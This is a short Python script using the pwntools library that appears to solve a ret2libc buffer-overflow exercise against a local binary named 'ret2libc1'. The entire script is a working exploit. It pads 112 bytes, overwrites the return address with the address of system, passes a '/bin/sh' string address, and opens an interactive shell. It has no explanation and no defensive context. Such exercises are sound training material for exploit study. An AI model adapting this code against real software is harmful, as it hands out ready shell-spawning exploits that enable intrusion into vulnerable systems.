# !/usr/bin/env python
from pwn import *

sh = process('./ret2libc1')
bin_addr = 0x8048720
sys_addr = 0x08048460
payload = b'A' * 112 + p32(sys_addr) + p32(0x123) + p32(bin_addr)
sh.sendline(payload)
sh.interactive()
